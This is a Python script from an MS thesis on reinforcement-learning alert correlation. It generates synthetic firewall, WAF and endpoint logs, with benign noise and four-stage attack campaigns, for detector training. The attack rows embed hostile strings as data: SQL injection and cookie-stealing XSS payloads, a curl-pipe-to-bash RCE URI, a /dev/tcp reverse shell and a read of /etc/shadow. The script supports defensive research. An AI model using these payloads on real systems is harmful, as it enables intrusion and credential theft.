"""
gen_synthetic.py - 3-Tier Multi-Source Synthetic Attack & Benign Telemetry Generator
MS Thesis: Reinforcement Learning-Based Adaptive Alerts Correlation for Detecting Multi-Stage Cyber Attacks
Candidate: Haaziq Rasool (Bahria University Islamabad)
Supervisor: Dr. Hafiz Ishfaq Ahmad

Generates 3 distinct synchronized telemetry streams mapped to Proposal Table 2:
1. data/synthetic/firewall_logs.csv (Network perimeter edge)
2. data/synthetic/web_waf_logs.csv (Application tier: SQLi, XSS, RCE, Webshells)
3. data/synthetic/endpoint_logs.csv (Host auditd & process execution)
4. data/synthetic/ground_truth.jsonl (Ground-truth campaign ledger)
"""

import os
import json
import random
import numpy as np
import pandas as pd
from datetime import datetime, timedelta
from typing import List, Dict, Tuple


def generate_3tier_synthetic_data(
    num_campaigns: int = 150,
    benign_firewall_count: int = 12000,
    benign_web_count: int = 8000,
    benign_endpoint_count: int = 12000,
    start_time_str: str = "2026-03-01 08:00:00",
    output_dir: str = "data/synthetic",
    seed: int = 42
) -> None:
    random.seed(seed)
    np.random.seed(seed)
    os.makedirs(output_dir, exist_ok=True)

    base_time = datetime.strptime(start_time_str, "%Y-%m-%d %H:%M:%S")
    simulation_duration_hours = 72
    end_time = base_time + timedelta(hours=simulation_duration_hours)

    print(f"[*] Initializing 3-Tier Synthetic Log Generation across {simulation_duration_hours} hours...")
    print(f"    - Target Campaigns : {num_campaigns}")
    print(f"    - Benign Firewall  : {benign_firewall_count:,} events")
    print(f"    - Benign Web/WAF   : {benign_web_count:,} events")
    print(f"    - Benign Endpoint  : {benign_endpoint_count:,} events")

    # Infrastructure IP space
    target_servers = [f"192.168.10.{i}" for i in range(10, 25)]
    internal_clients = [f"192.168.20.{i}" for i in range(50, 100)]
    external_benign_ips = [f"142.250.190.{i}" for i in range(1, 255)] + [f"45.33.32.{i}" for i in range(100, 200)]
    attacker_ip_pool = [f"203.0.113.{i}" for i in range(1, 100)] + [f"198.51.100.{i}" for i in range(1, 150)] + [f"185.220.101.{i}" for i in range(1, 200)]

    # Containers for logs
    firewall_events: List[Dict] = []
    web_events: List[Dict] = []
    endpoint_events: List[Dict] = []
    ground_truth_records: List[Dict] = []

    # =========================================================================
    # 1. GENERATE MULTI-STAGE ATTACK CAMPAIGNS (4 Causal Stages)
    # =========================================================================
    print(f"[*] Generating {num_campaigns} coordinated 4-stage attack campaigns...")
    for c_idx in range(1, num_campaigns + 1):
        campaign_id = f"CAMP-{c_idx:04d}"
        attacker_ip = random.choice(attacker_ip_pool)
        target_ip = random.choice(target_servers)

        # Distribute start times randomly across simulation duration
        start_offset_seconds = random.uniform(0, (simulation_duration_hours - 2) * 3600)
        t_stage1 = base_time + timedelta(seconds=start_offset_seconds)

        # Stage 1: Reconnaissance (Firewall)
        # Nmap SYN sweep / Port Scanning
        delta_t_1 = random.uniform(10.0, 45.0)
        t_stage1_end = t_stage1 + timedelta(seconds=delta_t_1)
        firewall_events.append({
            "timestamp": t_stage1.strftime("%Y-%m-%d %H:%M:%S.%f")[:-3],
            "src_ip": attacker_ip,
            "dst_ip": target_ip,
            "src_port": random.randint(30000, 65000),
            "dst_port": random.choice([80, 443, 8080, 22, 3306]),
            "protocol": "TCP",
            "action": "DENY",
            "rule_hit": "ET_SCAN_NMAP_SYN_PROBE",
            "bytes_transferred": random.randint(40, 120),
            "campaign_id": campaign_id,
            "attack_stage": 1,
            "label": 1
        })

        # Stage 2: Web Exploitation (Web/WAF + Firewall)
        # SQL Injection / XSS / Remote Code Execution / Webshell Upload
        delta_t_2 = random.uniform(15.0, 90.0)
        t_stage2 = t_stage1_end + timedelta(seconds=delta_t_2)
        web_attack_type = random.choice(["SQLI", "XSS", "RCE", "FILE_UPLOAD"])
        
        if web_attack_type == "SQLI":
            uri = f"/api/v1/users?id=1' UNION SELECT username,password_hash FROM users WHERE '1'='1"
            waf_rule = "MODSEC_RULE_942100_SQLI"
        elif web_attack_type == "XSS":
            uri = f"/search?q=<script>fetch('http://{attacker_ip}/steal?cookie='+document.cookie)</script>"
            waf_rule = "MODSEC_RULE_941100_XSS"
        elif web_attack_type == "RCE":
            uri = f"/cgi-bin/test.sh?cmd=curl -s http://{attacker_ip}:8000/shell.sh | bash"
            waf_rule = "MODSEC_RULE_932100_RCE"
        else:
            uri = f"/uploads/shell.php?cmd=id"
            waf_rule = "MODSEC_RULE_933100_PHP_WEBSHELL"

        web_events.append({
            "timestamp": t_stage2.strftime("%Y-%m-%d %H:%M:%S.%f")[:-3],
            "client_ip": attacker_ip,
            "server_ip": target_ip,
            "http_method": "POST" if web_attack_type in ["RCE", "FILE_UPLOAD"] else "GET",
            "uri_path": uri,
            "status_code": 200 if random.random() < 0.7 else 500,
            "attack_type": web_attack_type,
            "waf_rule_hit": waf_rule,
            "bytes_sent": random.randint(1024, 8192),
            "campaign_id": campaign_id,
            "attack_stage": 2,
            "label": 1
        })
        # Mirror HTTP connection in Firewall
        firewall_events.append({
            "timestamp": t_stage2.strftime("%Y-%m-%d %H:%M:%S.%f")[:-3],
            "src_ip": attacker_ip,
            "dst_ip": target_ip,
            "src_port": random.randint(30000, 65000),
            "dst_port": 80 if "443" not in uri else 443,
            "protocol": "TCP",
            "action": "ALLOW",
            "rule_hit": f"ET_WEB_EXPLOIT_{web_attack_type}",
            "bytes_transferred": random.randint(1024, 8192),
            "campaign_id": campaign_id,
            "attack_stage": 2,
            "label": 1
        })

        # Stage 3: Reverse Shell Establishment (Endpoint Auditd)
        delta_t_3 = random.uniform(20.0, 120.0)
        t_stage3 = t_stage2 + timedelta(seconds=delta_t_3)
        endpoint_events.append({
            "timestamp": t_stage3.strftime("%Y-%m-%d %H:%M:%S.%f")[:-3],
            "host_ip": target_ip,
            "src_ip": attacker_ip,
            "process_name": "bash",
            "parent_process": "nginx",
            "command_line": f"bash -i >& /dev/tcp/{attacker_ip}/4444 0>&1",
            "action": "PROCESS_SPAWN",
            "status": "SUCCESS",
            "rule_hit": "SIG_REVERSE_SHELL_EXECUTION",
            "campaign_id": campaign_id,
            "attack_stage": 3,
            "label": 1
        })

        # Stage 4: Privilege Escalation & Credential Access (Endpoint Auditd)
        delta_t_4 = random.uniform(30.0, 180.0)
        t_stage4 = t_stage3 + timedelta(seconds=delta_t_4)
        endpoint_events.append({
            "timestamp": t_stage4.strftime("%Y-%m-%d %H:%M:%S.%f")[:-3],
            "host_ip": target_ip,
            "src_ip": attacker_ip,
            "process_name": "sudo",
            "parent_process": "bash",
            "command_line": "sudo -u root cat /etc/shadow",
            "action": "PRIVILEGE_ELEVATION",
            "status": "SUCCESS",
            "rule_hit": "SIG_CREDENTIAL_ACCESS_SHADOW",
            "campaign_id": campaign_id,
            "attack_stage": 4,
            "label": 1
        })

        ground_truth_records.append({
            "campaign_id": campaign_id,
            "attacker_ip": attacker_ip,
            "target_ip": target_ip,
            "start_time": t_stage1.strftime("%Y-%m-%d %H:%M:%S.%f")[:-3],
            "end_time": t_stage4.strftime("%Y-%m-%d %H:%M:%S.%f")[:-3],
            "total_stages": 4,
            "stages": [
                {"stage": 1, "time": t_stage1.strftime("%Y-%m-%d %H:%M:%S.%f")[:-3], "type": "Firewall Recon"},
                {"stage": 2, "time": t_stage2.strftime("%Y-%m-%d %H:%M:%S.%f")[:-3], "type": "Web/WAF Exploit"},
                {"stage": 3, "time": t_stage3.strftime("%Y-%m-%d %H:%M:%S.%f")[:-3], "type": "Endpoint Reverse Shell"},
                {"stage": 4, "time": t_stage4.strftime("%Y-%m-%d %H:%M:%S.%f")[:-3], "type": "Endpoint Priv Escalation"}
            ]
        })

    # =========================================================================
    # 2. GENERATE HIGH-VOLUME BENIGN BACKGROUND NOISE
    # =========================================================================
    print("[*] Generating benign background noise across all 3 tiers...")
    
    # Benign Firewall Traffic
    for _ in range(benign_firewall_count):
        t_rand = base_time + timedelta(seconds=random.uniform(0, simulation_duration_hours * 3600))
        s_ip = random.choice(internal_clients) if random.random() < 0.6 else random.choice(external_benign_ips)
        d_ip = random.choice(external_benign_ips) if s_ip in internal_clients else random.choice(target_servers)
        port = random.choice([80, 443, 53, 22, 445])
        firewall_events.append({
            "timestamp": t_rand.strftime("%Y-%m-%d %H:%M:%S.%f")[:-3],
            "src_ip": s_ip,
            "dst_ip": d_ip,
            "src_port": random.randint(1024, 65535),
            "dst_port": port,
            "protocol": "TCP" if port != 53 else "UDP",
            "action": "ALLOW",
            "rule_hit": "DEFAULT_OUTBOUND_ALLOW" if port in [80, 443, 53] else "INTERNAL_SSH_ALLOW",
            "bytes_transferred": random.randint(200, 50000),
            "campaign_id": "BENIGN",
            "attack_stage": 0,
            "label": 0
        })

    # Benign Web / WAF Traffic
    benign_endpoints_list = ["/", "/index.html", "/about", "/products", "/contact", "/static/css/main.css", "/static/js/app.js", "/images/logo.png"]
    for _ in range(benign_web_count):
        t_rand = base_time + timedelta(seconds=random.uniform(0, simulation_duration_hours * 3600))
        s_ip = random.choice(external_benign_ips + internal_clients)
        d_ip = random.choice(target_servers)
        web_events.append({
            "timestamp": t_rand.strftime("%Y-%m-%d %H:%M:%S.%f")[:-3],
            "client_ip": s_ip,
            "server_ip": d_ip,
            "http_method": "GET" if random.random() < 0.85 else "POST",
            "uri_path": random.choice(benign_endpoints_list),
            "status_code": random.choice([200, 301, 304, 404]),
            "attack_type": "BENIGN",
            "waf_rule_hit": "WAF_BENIGN_PASS",
            "bytes_sent": random.randint(300, 15000),
            "campaign_id": "BENIGN",
            "attack_stage": 0,
            "label": 0
        })

    # Benign Endpoint Telemetry
    benign_procs = [
        ("systemd", "kernel", "systemd --system", "SERVICE_START", "INFO_SYS_DAEMON"),
        ("mysqld", "systemd", "/usr/sbin/mysqld", "DB_QUERY", "INFO_DATABASE_OPS"),
        ("nginx", "systemd", "nginx: worker process", "SERVICE_POLL", "INFO_WEB_WORKER"),
        ("cron", "systemd", "/usr/sbin/cron -f", "CRON_EXECUTE", "INFO_PERIODIC_CRON"),
        ("python3", "bash", "python3 data_backup.py", "SCRIPT_EXECUTE", "INFO_MAINTENANCE_SCRIPT"),
        ("code", "explorer.exe", "code.exe --unity-launch", "APP_LAUNCH", "INFO_DEV_TOOL")
    ]
    for _ in range(benign_endpoint_count):
        t_rand = base_time + timedelta(seconds=random.uniform(0, simulation_duration_hours * 3600))
        h_ip = random.choice(target_servers + internal_clients)
        proc, parent, cmd, act, rule = random.choice(benign_procs)
        endpoint_events.append({
            "timestamp": t_rand.strftime("%Y-%m-%d %H:%M:%S.%f")[:-3],
            "host_ip": h_ip,
            "src_ip": h_ip,
            "process_name": proc,
            "parent_process": parent,
            "command_line": cmd,
            "action": act,
            "status": "SUCCESS",
            "rule_hit": rule,
            "campaign_id": "BENIGN",
            "attack_stage": 0,
            "label": 0
        })

    # =========================================================================
    # 3. SORT CHRONOLOGICALLY AND SAVE TO DISK
    # =========================================================================
    df_fw = pd.DataFrame(firewall_events).sort_values(by="timestamp").reset_index(drop=True)
    df_web = pd.DataFrame(web_events).sort_values(by="timestamp").reset_index(drop=True)
    df_ep = pd.DataFrame(endpoint_events).sort_values(by="timestamp").reset_index(drop=True)

    fw_path = os.path.join(output_dir, "firewall_logs.csv")
    web_path = os.path.join(output_dir, "web_waf_logs.csv")
    ep_path = os.path.join(output_dir, "endpoint_logs.csv")
    gt_path = os.path.join(output_dir, "ground_truth.jsonl")

    df_fw.to_csv(fw_path, index=False)
    df_web.to_csv(web_path, index=False)
    df_ep.to_csv(ep_path, index=False)

    with open(gt_path, "w") as f:
        for rec in ground_truth_records:
            f.write(json.dumps(rec) + "\n")

    print(f"\n[+] Successfully generated 3-Tier Synthetic Datasets:")
    print(f"    - Firewall Logs : {len(df_fw):,} rows -> {fw_path}")
    print(f"    - Web / WAF Logs: {len(df_web):,} rows -> {web_path}")
    print(f"    - Endpoint Logs : {len(df_ep):,} rows -> {ep_path}")
    print(f"    - Ground Truth  : {len(ground_truth_records):,} campaigns -> {gt_path}")


if __name__ == "__main__":
    generate_3tier_synthetic_data()
